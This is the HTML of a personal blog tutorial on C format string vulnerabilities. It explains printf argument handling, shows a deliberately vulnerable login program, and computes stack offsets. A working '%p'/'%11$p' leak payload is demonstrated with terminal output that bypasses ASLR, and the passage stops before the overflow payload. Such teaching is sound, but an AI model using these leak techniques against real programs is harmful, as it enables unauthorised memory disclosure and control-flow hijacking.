<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Format String Vulnerability | Sanketh's Blog</title><meta name=keywords content="vulnerabilities,format string,buffer overflow,reverse engineering"><meta name=description content="Format String Vulnerabilities
Why Information Leaks Matter in Modern Exploitation
The ASLR Problem
Modern systems use Address Space Layout Randomization (ASLR) to randomize memory locations:

Stack addresses change every execution
Heap addresses randomized
Library (libc) addresses randomized
Code addresses randomized (with PIE)

The dilemma:

You can overflow a buffer and control the return address (this is again assuming we somehow defeated the canary)
But you don&rsquo;t know WHERE to point it (shellcode location unknown)
Even ROP gadget addresses are randomized
You need to LEAK memory addresses first!

Format string vulnerabilities are one of the most powerful information leak primitives."><meta name=author content="Sanketh"><link rel=canonical href=https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-12-10-format-string/><link crossorigin=anonymous href=/blog/assets/css/stylesheet.deee627d8b8d9065acc54b2c9d901e601e142335047d242a93ba7bce86f41f19.css integrity="sha256-3u5ifYuNkGWsxUssnZAeYB4UIzUEfSQqk7p7zob0Hxk=" rel="preload stylesheet" as=style><link rel=icon href=https://sankethbk.github.io/blog/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sankethbk.github.io/blog/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sankethbk.github.io/blog/favicon-32x32.png><link rel=apple-touch-icon href=https://sankethbk.github.io/blog/apple-touch-icon.png><link rel=mask-icon href=https://sankethbk.github.io/blog/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-12-10-format-string/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-12-10-format-string/"><meta property="og:site_name" content="Sanketh's Blog"><meta property="og:title" content="Format String Vulnerability"><meta property="og:description" content="Format String Vulnerabilities Why Information Leaks Matter in Modern Exploitation The ASLR Problem Modern systems use Address Space Layout Randomization (ASLR) to randomize memory locations:
Stack addresses change every execution Heap addresses randomized Library (libc) addresses randomized Code addresses randomized (with PIE) The dilemma:
You can overflow a buffer and control the return address (this is again assuming we somehow defeated the canary) But you don’t know WHERE to point it (shellcode location unknown) Even ROP gadget addresses are randomized You need to LEAK memory addresses first! Format string vulnerabilities are one of the most powerful information leak primitives."><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-12-10T00:00:00+00:00"><meta property="article:modified_time" content="2025-12-10T00:00:00+00:00"><meta property="article:tag" content="Vulnerabilities"><meta property="article:tag" content="Format String"><meta property="article:tag" content="Buffer Overflow"><meta property="article:tag" content="Reverse Engineering"><meta name=twitter:card content="summary"><meta name=twitter:title content="Format String Vulnerability"><meta name=twitter:description content="Format String Vulnerabilities
Why Information Leaks Matter in Modern Exploitation
The ASLR Problem
Modern systems use Address Space Layout Randomization (ASLR) to randomize memory locations:

Stack addresses change every execution
Heap addresses randomized
Library (libc) addresses randomized
Code addresses randomized (with PIE)

The dilemma:

You can overflow a buffer and control the return address (this is again assuming we somehow defeated the canary)
But you don&rsquo;t know WHERE to point it (shellcode location unknown)
Even ROP gadget addresses are randomized
You need to LEAK memory addresses first!

Format string vulnerabilities are one of the most powerful information leak primitives."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://sankethbk.github.io/blog/posts/"},{"@type":"ListItem","position":2,"name":"Format String Vulnerability","item":"https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-12-10-format-string/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Format String Vulnerability","name":"Format String Vulnerability","description":"Format String Vulnerabilities Why Information Leaks Matter in Modern Exploitation The ASLR Problem Modern systems use Address Space Layout Randomization (ASLR) to randomize memory locations:\nStack addresses change every execution Heap addresses randomized Library (libc) addresses randomized Code addresses randomized (with PIE) The dilemma:\nYou can overflow a buffer and control the return address (this is again assuming we somehow defeated the canary) But you don\u0026rsquo;t know WHERE to point it (shellcode location unknown) Even ROP gadget addresses are randomized You need to LEAK memory addresses first! Format string vulnerabilities are one of the most powerful information leak primitives.\n","keywords":["vulnerabilities","format string","buffer overflow","reverse engineering"],"articleBody":"Format String Vulnerabilities Why Information Leaks Matter in Modern Exploitation The ASLR Problem Modern systems use Address Space Layout Randomization (ASLR) to randomize memory locations:\nStack addresses change every execution Heap addresses randomized Library (libc) addresses randomized Code addresses randomized (with PIE) The dilemma:\nYou can overflow a buffer and control the return address (this is again assuming we somehow defeated the canary) But you don’t know WHERE to point it (shellcode location unknown) Even ROP gadget addresses are randomized You need to LEAK memory addresses first! Format string vulnerabilities are one of the most powerful information leak primitives.\nFormat Strings in C Format strings are used by functions like printf, sprintf, fprintf to format output with placeholders. These are not simple string printers. They are mini interpreters.\nExample\nprintf(\"x = %d, y = %d\\n\", x, y); Here: \"x = %d, y = %d\\n\" is not data It is a program that tells printf:\nPrint literal text x = Fetch an integer argument → print it as decimal Print , y = Fetch another integer argument → print it Print newline So: A format string is instructions for how to consume arguments and produce output.\nCommon format specifiers | Specifier | Meaning | How argument is interpreted | | --------- | -------- | --------------------------- | | `%d` | decimal | `int` | | `%u` | unsigned | `unsigned int` | | `%x` | hex | `unsigned int` | | `%p` | pointer | `void*` | | `%s` | string | pointer → dereference | | `%c` | char | integer → cast | | `%f` | float | double (promotion rules) | | `%n` | Write count to memory | (no output) | We can also pass width, precision, and modifiers\n%08x %.3f %10s %lld These don’t change where data comes from — they change how it’s formatted.\nHow printf actually processes arguments? arg_ptr = start_of_arguments; for each character in format_string: if character != '%': print(character) else: specifier = parse_specifier() value = *arg_ptr arg_ptr++ print(value according to specifier) We can. see what’s missing:\nNo check that arg_ptr is valid No check that caller provided enough arguments No type safety Variadic functions: the critical design choice int printf(const char *fmt, ...); This means: •\tThe compiler does not know how many arguments are passed •\tOnly the format string tells printf how many arguments exist •\tThere is no runtime verification\nSo printf blindly trusts the format string. This is not a bug — it’s how C was designed.\nWhere do the arguments come from? In 32-bit x86 all arguments of printf will be on stack.\nStack layout:\nHigh addresses ┌─────────────────┐ │ arg3 │ ├─────────────────┤ │ arg2 │ ├─────────────────┤ │ arg1 │ ├─────────────────┤ │ format string │ ← printf's first argument ├─────────────────┤ │ return address │ └─────────────────┘ Low addresses 64-bit x86-64 (AMD64) - First 6 in Registers. Calling convention (System V AMD64 ABI):\n- RDI = 1st argument (format string) - RSI = 2nd argument - RDX = 3rd argument - RCX = 4th argument - R8 = 5th argument - R9 = 6th argument - Stack = 7th argument onwards This doesn’t change much, it just means it will leak addresses only when there are more than 7 format specifiers and not enough values.\nThe Vulnerability: User Input as Format String The critical mistake is passing user input as a format string.\nchar user_input[100]; fgets(user_input, sizeof(user_input), stdin); // DANGEROUS: User input used directly as format string printf(user_input); Why this is dangerous:\nUser controls the format string User can inject format specifiers like %x, %s, %n These specifiers will read or write memory without authorization Can lead to information disclosure or arbitrary code execution Sample Program With Vulnerability #include #include void grantAccess() { printf(\"Access Granted\\n\"); } void checkPassword(char* password, int *isAuthenticated) { if (strcmp(password, \"admin123\") == 0) { *isAuthenticated = 1; } } void AuthenticateUser() { char password[8]; char username[8]; int isAuthenticated = 0; printf(\"Enter Username: \"); scanf(\"%s\", username); printf(\"Enter password for: \"); printf(username); scanf(\"%s\", password); checkPassword(password, \u0026isAuthenticated); if (isAuthenticated == 1) { grantAccess(); } else { printf(\"Authentication Failed\\n\"); } } int main() { AuthenticateUser(); } This is a version of the program we previously used in buffer overflows, but this time we will do it without disabling ASLR and without inspecting with GDB.\nprintf(username); This is the line which allows us to exploit format string vulnerability. A safe version would’ve been\nprintf(\"%s\", username); We still need to disable stackguard as our attack is based on buffer overflow\n$ gcc -fno-stack-protector -O0 -o vuln main.c main.c: In function ‘AuthenticateUser’: main.c:26:17: warning: format not a string literal and no format arguments [-Wformat-security] 26 | printf(username); | ^~~~~~~~ We can see gcc shows us warning that we are passing only format string an not arguments. Static analysis can catch format strings vulnerability very effectively.\nLet’s look at the assembly of AuthenticateUser function to confirm the vulenrability\n$ objdump -d -M intel,mnemonic,no-att -j .text vuln 00000000000011fe : 11fe:\tf3 0f 1e fa endbr64 1202:\t55 push rbp 1203:\t48 89 e5 mov rbp,rsp 1206:\t48 83 ec 20 sub rsp,0x20 120a:\tc7 45 ec 00 00 00 00 mov DWORD PTR [rbp-0x14],0x0 1211:\t48 8d 05 04 0e 00 00 lea rax,[rip+0xe04] # 201c \u003c_IO_stdin_used+0x1c\u003e 1218:\t48 89 c7 mov rdi,rax 121b:\tb8 00 00 00 00 mov eax,0x0 1220:\te8 6b fe ff ff call 1090 1225:\t48 8d 45 f0 lea rax,[rbp-0x10] 1229:\t48 89 c6 mov rsi,rax 122c:\t48 8d 05 fa 0d 00 00 lea rax,[rip+0xdfa] # 202d \u003c_IO_stdin_used+0x2d\u003e 1233:\t48 89 c7 mov rdi,rax 1236:\tb8 00 00 00 00 mov eax,0x0 123b:\te8 70 fe ff ff call 10b0 \u003c__isoc99_scanf@plt\u003e 1240:\t48 8d 05 e9 0d 00 00 lea rax,[rip+0xde9] # 2030 \u003c_IO_stdin_used+0x30\u003e 1247:\t48 89 c7 mov rdi,rax 124a:\tb8 00 00 00 00 mov eax,0x0 124f:\te8 3c fe ff ff call 1090 1254:\t48 8d 45 f0 lea rax,[rbp-0x10] 1258:\t48 89 c7 mov rdi,rax 125b:\tb8 00 00 00 00 mov eax,0x0 1260:\te8 2b fe ff ff call 1090 1265:\t48 8d 45 f8 lea rax,[rbp-0x8] 1269:\t48 89 c6 mov rsi,rax 126c:\t48 8d 05 ba 0d 00 00 lea rax,[rip+0xdba] # 202d \u003c_IO_stdin_used+0x2d\u003e 1273:\t48 89 c7 mov rdi,rax 1276:\tb8 00 00 00 00 mov eax,0x0 127b:\te8 30 fe ff ff call 10b0 \u003c__isoc99_scanf@plt\u003e 1280:\t48 8d 55 ec lea rdx,[rbp-0x14] 1284:\t48 8d 45 f8 lea rax,[rbp-0x8] 1288:\t48 89 d6 mov rsi,rdx 128b:\t48 89 c7 mov rdi,rax 128e:\te8 30 ff ff ff call 11c3 1293:\t8b 45 ec mov eax,DWORD PTR [rbp-0x14] 1296:\t83 f8 01 cmp eax,0x1 1299:\t75 0c jne 12a7 129b:\tb8 00 00 00 00 mov eax,0x0 12a0:\te8 04 ff ff ff call 11a9 12a5:\teb 0f jmp 12b6 12a7:\t48 8d 05 97 0d 00 00 lea rax,[rip+0xd97] # 2045 \u003c_IO_stdin_used+0x45\u003e 12ae:\t48 89 c7 mov rdi,rax 12b1:\te8 ca fd ff ff call 1080 12b6:\t90 nop 12b7:\tc9 leave 12b8:\tc3 ret We know the calling convention is to place first parameter in rdi and second parameter in rsi.\nWe can see in the first two printf calls, the value in rdi is taken from .rodata section. It uses RIP relative addressing here to point to the address of the hardcoded format strings.\n122c:\t48 8d 05 fa 0d 00 00 lea rax,[rip+0xdfa] # 202d \u003c_IO_stdin_used+0x2d\u003e 1233:\t48 89 c7 mov rdi,rax 1236:\tb8 00 00 00 00 mov eax,0x0 123b:\te8 70 fe ff ff call 10b0 \u003c__isoc99_scanf@plt\u003e 1240:\t48 8d 05 e9 0d 00 00 lea rax,[rip+0xde9] # 2030 \u003c_IO_stdin_used+0x30\u003e 1247:\t48 89 c7 mov rdi,rax 124a:\tb8 00 00 00 00 mov eax,0x0 124f:\te8 3c fe ff ff call 1090 But in the third printf\n1254:\t48 8d 45 a0 lea rax,[rbp-0x10] 1258:\t48 89 c7 mov rdi,rax 125b:\tb8 00 00 00 00 mov eax,0x0 1260:\te8 2b fe ff ff call 1090 We can see the adress written to rdi is relative to rbp which means its clearly on the stack and its the address of the username variable.\nExploit 1: Leak the Stack Adresses and Relace the Return Address of AuthenticateUser to grantAccess Let’s visualize the stack layout:\n1206:\tsub rsp,0x20 # Allocate 32 bytes (0x20) 120a:\tmov DWORD PTR [rbp-0x14],0x0 # isAuthenticated 1225:\tlea rax,[rbp-0x10] # username 1265:\tlea rax,[rbp-0x8] # password Stack layout:\nHigher addresses ┌──────────────────────┐ │ Return address │ ← [rbp+8] (0x12cb - points to main) │ (0x55...12cb) │ **WE WANT TO OVERWRITE THIS!** ├──────────────────────┤ │ Saved RBP │ ← [rbp] (8 bytes) ├──────────────────────┤ │ password[8] │ ← [rbp-0x8] (8 bytes from RBP) ├──────────────────────┤ │ username[8] │ ← [rbp-0x10] (16 bytes from RBP) ├──────────────────────┤ │ isAuthenticated (4) │ ← [rbp-0x14] (20 bytes from RBP) ├──────────────────────┤ │ padding (12 bytes) │ ← [rbp-0x20] (unused, stack aligned) └──────────────────────┘ Lower addresses Total stack frame: 32 bytes (0x20)\nCalculating Key Distances 1. Distance of Password From Saved RA This is what we need to leak with format string vulnerability and overwrite it later\nusername at [rbp-0x10] password at [rbp-0x8] return address at [rbp+8] Distance from username to return address: 0x10 + 8 = 24 bytes Distance from password to return address: 0x8 + 8 = 16 bytes 2. The Actual Address of grantAccess This is where we need to jump to using buffer overflow and the previous information leaked.\nNow lets calculate the address of grantAccess: Since this is PIE + ASLR enabled binary and we are not using GDB, we need a creative way to find dynamic address of grantAccess function. One insight that we can recall is, even with PIE and ASLR enabled, the relative distance between the lines of code in .text section remains same.\n00000000000012b9 : 12b9:\tf3 0f 1e fa endbr64 12bd:\t55 push rbp 12be:\t48 89 e5 mov rbp,rsp 12c1:\tb8 00 00 00 00 mov eax,0x0 12c6:\te8 33 ff ff ff call 11fe 12cb:\tb8 00 00 00 00 mov eax,0x0 -\u003e this is the return address of AuthenticateUser 12d0:\t5d pop rbp 12d1:\tc3 ret Return address (leaked): 0x12cb grantAccess: 0x11a9 Offset: 0x12cb - 0x11a9 = 0x122 (290 bytes) Since we would’ve already leaked the return address in main using format string in our previous step, we can add this offset of 290 bytes to get the actual address of grantAccess.\n3. Correct Argument to Leak From printf When we call printf:\ncall printf Inside printf’s perspective:\nPosition 1-6: RDI, RSI, RDX, RCX, R8, R9 (registers) Position 7: [rsp] ← First stack parameter Position 8: [rsp+8] ← Second stack parameter Position 9: [rsp+16] ← Third stack parameter Position 10: [rsp+24] etc. What the Compiler Generates:\n# Caller (before call printf): push arg8 # Push in reverse order push arg7 mov r9, arg6 # Load registers mov r8, arg5 mov rcx, arg4 mov rdx, arg3 mov rsi, arg2 mov rdi, arg1 call printf # Now RSP points right at arg7! # After printf returns: add rsp, 16 # Clean up the 2 stack args (arg7, arg8) Since callee is passing the variadic arguments, it will be located on the stack before the printf’s stack frame is set up.\nThis is the stack frame just before printf is about to be called, the callee has pushed the variadic arguments ot stack (in this case its not) and saved the return adddress to callee. The printf’s prologue has not been executed yet. Since the variadic argument va_list is already present on stack, we can guarantee that printf’s arg_ptr starts scanning arguments from there and the actual stack frame of printf doesn’t even matter.\nHigher addresses ┌──────────────────────┐ │ Return to main │ ← AuthenticateUser return addr (TARGET) ├──────────────────────┤ │ Saved RBP │ ├──────────────────────┤ │ password[8] │ ├──────────────────────┤ │ username[8] │ ├──────────────────────┤ │ isAuthenticated + │ │ padding │ ├──────────────────────┤ │ va_list │ ← printf's arg_ptr starts, here, it will look like [rbp+8] in printf's assembly ├──────────────────────┤ │ return address to. | | AuthenticateUser. │ ← [rsp] of AuthenticateUser └──────────────────────┘ Lower addresses By looking at the stack we built previously. We can see we ened to move the printf’s arg_ptr 5 times. So considering 6 register arguments, we get 6 + 5 = 11. So we need to leak the 12th value in what printf thinks is a value to format string.\nWe can use %p to print the addresses with 0x prefix. If we add %p 11 times, we will leak the 11th argument.\nsanketh@sanketh-81de:$ ./vuln Enter Username: %p%p%p%p%p%p%p%p%p%p%p Enter password for: 0x7ffded20f2c0(nil)(nil)0xa0xffffffff(nil)(nil)0x70257025702570250x70257025702570250x7025702570250x5d61a35072cb^C sanketh@sanketh-81de:$ ./vuln Enter Username: %p%p%p%p%p%p%p%p%p%p%p Enter password for: 0x7ffeb89c1e40(nil)(nil)0xa0xffffffff(nil)(nil)0x70257025702570250x70257025702570250x7025702570250x5ce761ba72cb^C sanketh@sanketh-81de:$ ./vuln Enter Username: %p%p%p%p%p%p%p%p%p%p%p Enter password for: 0x7ffe874444d0(nil)(nil)0xa0xffffffff(nil)(nil)0x70257025702570250x70257025702570250x7025702570250x5ca4fddfe2cb^C sanketh@sanketh-81de:$ ./vuln Enter Username: %p%p%p%p%p%p%p%p%p%p%p Enter password for: 0x7ffd4ef49d80(nil)(nil)0xa0xffffffff(nil)(nil)0x70257025702570250x70257025702570250x7025702570250x651533b3e2cb^C We can see even with ASLR, our return address consistenly ends with 2cb. In fact even the static address on binary showed the address ending with 2cb.\n12cb:\tb8 00 00 00 00 mov eax,0x0 -\u003e this is the return address of AuthenticateUser The important observation here is, the last 3 nibbles remains unchanged even after ASLR!\nIts because of the page alignment •\tPage size = 4096 bytes = 0x1000 •\tThat means the lowest 12 bits are always zero\nSo the constant offset ASLR will be adding has to be a multiple of 4096 which means last 3 nibbles are always 0. Otherwise it would disturb the page layout of segments.\nWe can use this as to double confirm we’re headed in the right direction. Or we can also do rough calculation and leak a set of addresses around our estimate and look for the one ending with expected last 12 bits.\nSometimes we may not have space to tpe enough %p’s, the content itself might overflow and end up overwriting the return address which will simply crash the program. There is another we can print any argument with just 8 bytes of input\nEnter Username: %11$p Enter password for: 0x5a45b5b602cb This will directly take us to the 11th parameter.\nBuilding the Payload for Buffer Overflow ","wordCount":"2336","inLanguage":"en","datePublished":"2025-12-10T00:00:00Z","dateModified":"2025-12-10T00:00:00Z","author":{"@type":"Person","name":"Sanketh"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-12-10-format-string/"},"publisher":{"@type":"Organization","name":"Sanketh's Blog","logo":{"@type":"ImageObject","url":"https://sankethbk.github.io/blog/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://sankethbk.github.io/blog/ accesskey=h title="Sanketh's Blog (Alt + H)">Sanketh's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu></ul></nav></header><main class=main><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Format String Vulnerability</h1><div class=post-meta><span title='2025-12-10 00:00:00 +0000 UTC'>December 10, 2025</span>&nbsp;·&nbsp;11 min&nbsp;·&nbsp;Sanketh&nbsp;|&nbsp;<a href=https://github.com/SankethBK/blog/edit/main/content/posts/reverse-engineering/vulnerabilities/2025-12-10-format-string.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#format-string-vulnerabilities aria-label="Format String Vulnerabilities">Format String Vulnerabilities</a><ul><li><a href=#why-information-leaks-matter-in-modern-exploitation aria-label="Why Information Leaks Matter in Modern Exploitation">Why Information Leaks Matter in Modern Exploitation</a><ul><li><a href=#the-aslr-problem aria-label="The ASLR Problem">The ASLR Problem</a></li></ul></li><li><a href=#format-strings-in-c aria-label="Format Strings in C">Format Strings in C</a><ul><li><a href=#common-format-specifiers aria-label="Common format specifiers">Common format specifiers</a></li><li><a href=#how-printf-actually-processes-arguments aria-label="How printf actually processes arguments?">How printf actually processes arguments?</a></li><li><a href=#variadic-functions-the-critical-design-choice aria-label="Variadic functions: the critical design choice">Variadic functions: the critical design choice</a><ul><li><a href=#where-do-the-arguments-come-from aria-label="Where do the arguments come from?">Where do the arguments come from?</a></li></ul></li></ul></li><li><a href=#the-vulnerability-user-input-as-format-string aria-label="The Vulnerability: User Input as Format String">The Vulnerability: User Input as Format String</a><ul><li><a href=#sample-program-with-vulnerability aria-label="Sample Program With Vulnerability">Sample Program With Vulnerability</a></li><li><a href=#exploit-1-leak-the-stack-adresses-and-relace-the-return-address-of-authenticateuser-to-grantaccess aria-label="Exploit 1: Leak the Stack Adresses and Relace the Return Address of AuthenticateUser to grantAccess">Exploit 1: Leak the Stack Adresses and Relace the Return Address of AuthenticateUser to grantAccess</a><ul><li><a href=#calculating-key-distances aria-label="Calculating Key Distances">Calculating Key Distances</a><ul><li><a href=#1-distance-of-password-from-saved-ra aria-label="1. Distance of Password From Saved RA">1. Distance of Password From Saved RA</a></li><li><a href=#2-the-actual-address-of-grantaccess aria-label="2. The Actual Address of grantAccess">2. The Actual Address of grantAccess</a></li><li><a href=#3-correct-argument-to-leak-from-printf aria-label="3. Correct Argument to Leak From printf">3. Correct Argument to Leak From printf</a></li></ul></li></ul></li><li><a href=#building-the-payload-for-buffer-overflow aria-label="Building the Payload for Buffer Overflow">Building the Payload for Buffer Overflow</a></li></ul></li></ul></li></ul></div></details></div><div class=post-content><h1 id=format-string-vulnerabilities>Format String Vulnerabilities<a hidden class=anchor aria-hidden=true href=#format-string-vulnerabilities>#</a></h1><h2 id=why-information-leaks-matter-in-modern-exploitation>Why Information Leaks Matter in Modern Exploitation<a hidden class=anchor aria-hidden=true href=#why-information-leaks-matter-in-modern-exploitation>#</a></h2><h3 id=the-aslr-problem>The ASLR Problem<a hidden class=anchor aria-hidden=true href=#the-aslr-problem>#</a></h3><p>Modern systems use Address Space Layout Randomization (ASLR) to randomize memory locations:</p><ul><li>Stack addresses change every execution</li><li>Heap addresses randomized</li><li>Library (libc) addresses randomized</li><li>Code addresses randomized (with PIE)</li></ul><p><strong>The dilemma:</strong></p><ul><li>You can overflow a buffer and control the return address (this is again assuming we somehow defeated the canary)</li><li>But you don&rsquo;t know WHERE to point it (shellcode location unknown)</li><li>Even ROP gadget addresses are randomized</li><li>You need to LEAK memory addresses first!</li></ul><p>Format string vulnerabilities are one of the most powerful information leak primitives.</p><h2 id=format-strings-in-c>Format Strings in C<a hidden class=anchor aria-hidden=true href=#format-strings-in-c>#</a></h2><p>Format strings are used by functions like <code>printf</code>, <code>sprintf</code>, <code>fprintf</code> to format output with placeholders. These are not simple string printers. They are mini interpreters.</p><p>Example</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;x = %d, y = %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, x, y);
</span></span></code></pre></div><p>Here:
<code>"x = %d, y = %d\n"</code> is not data It is a program that tells printf:</p><ol><li>Print literal text <code>x =</code></li><li>Fetch an integer argument → print it as decimal</li><li>Print , <code>y =</code></li><li>Fetch another integer argument → print it</li><li>Print newline</li></ol><p>So: A format string is instructions for how to consume arguments and produce output.</p><h3 id=common-format-specifiers>Common format specifiers<a hidden class=anchor aria-hidden=true href=#common-format-specifiers>#</a></h3><pre tabindex=0><code>| Specifier | Meaning  | How argument is interpreted |
| --------- | -------- | --------------------------- |
| `%d`      | decimal  | `int`                       |
| `%u`      | unsigned | `unsigned int`              |
| `%x`      | hex      | `unsigned int`              |
| `%p`      | pointer  | `void*`                     |
| `%s`      | string   | pointer → dereference       |
| `%c`      | char     | integer → cast              |
| `%f`      | float    | double (promotion rules)    |
| `%n`      | Write count to memory | (no output)    |
</code></pre><p>We can also pass width, precision, and modifiers</p><pre tabindex=0><code>%08x
%.3f
%10s
%lld
</code></pre><p>These don’t change where data comes from — they change how it’s formatted.</p><h3 id=how-printf-actually-processes-arguments>How printf actually processes arguments?<a hidden class=anchor aria-hidden=true href=#how-printf-actually-processes-arguments>#</a></h3><pre tabindex=0><code>arg_ptr = start_of_arguments;

for each character in format_string:
    if character != &#39;%&#39;:
        print(character)
    else:
        specifier = parse_specifier()
        value = *arg_ptr
        arg_ptr++
        print(value according to specifier)
</code></pre><p>We can. see what’s missing:</p><ul><li>No check that <code>arg_ptr</code> is valid</li><li>No check that caller provided enough arguments</li><li>No type safety</li></ul><h3 id=variadic-functions-the-critical-design-choice>Variadic functions: the critical design choice<a hidden class=anchor aria-hidden=true href=#variadic-functions-the-critical-design-choice>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>printf</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>fmt, ...);
</span></span></code></pre></div><p>This means:
• The compiler does not know how many arguments are passed
• Only the format string tells printf how many arguments exist
• There is no runtime verification</p><p>So <code>printf</code> blindly trusts the format string. This is not a bug — it’s how C was designed.</p><h4 id=where-do-the-arguments-come-from>Where do the arguments come from?<a hidden class=anchor aria-hidden=true href=#where-do-the-arguments-come-from>#</a></h4><p>In 32-bit x86 all arguments of <code>printf</code> will be on stack.</p><p><strong>Stack layout:</strong></p><pre tabindex=0><code>High addresses
┌─────────────────┐
│ arg3            │
├─────────────────┤
│ arg2            │
├─────────────────┤
│ arg1            │
├─────────────────┤
│ format string   │ ← printf&#39;s first argument
├─────────────────┤
│ return address  │
└─────────────────┘
Low addresses
</code></pre><p>64-bit x86-64 (AMD64) - First 6 in Registers. Calling convention (System V AMD64 ABI):</p><pre tabindex=0><code>- RDI = 1st argument (format string)
- RSI = 2nd argument
- RDX = 3rd argument
- RCX = 4th argument
- R8  = 5th argument
- R9  = 6th argument
- Stack = 7th argument onwards
</code></pre><p>This doesn&rsquo;t change much, it just means it will leak addresses only when there are more than 7 format specifiers and not enough values.</p><h2 id=the-vulnerability-user-input-as-format-string>The Vulnerability: User Input as Format String<a hidden class=anchor aria-hidden=true href=#the-vulnerability-user-input-as-format-string>#</a></h2><p>The critical mistake is passing user input as a format string.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>char</span> user_input[<span style=color:#ae81ff>100</span>];
</span></span><span style=display:flex><span><span style=color:#a6e22e>fgets</span>(user_input, <span style=color:#66d9ef>sizeof</span>(user_input), stdin);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// DANGEROUS: User input used directly as format string
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>printf</span>(user_input);
</span></span></code></pre></div><p><strong>Why this is dangerous:</strong></p><ul><li>User controls the format string</li><li>User can inject format specifiers like <code>%x</code>, <code>%s</code>, <code>%n</code></li><li>These specifiers will read or write memory without authorization</li><li>Can lead to information disclosure or arbitrary code execution</li></ul><h3 id=sample-program-with-vulnerability>Sample Program With Vulnerability<a hidden class=anchor aria-hidden=true href=#sample-program-with-vulnerability>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>grantAccess</span>() {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Access Granted</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
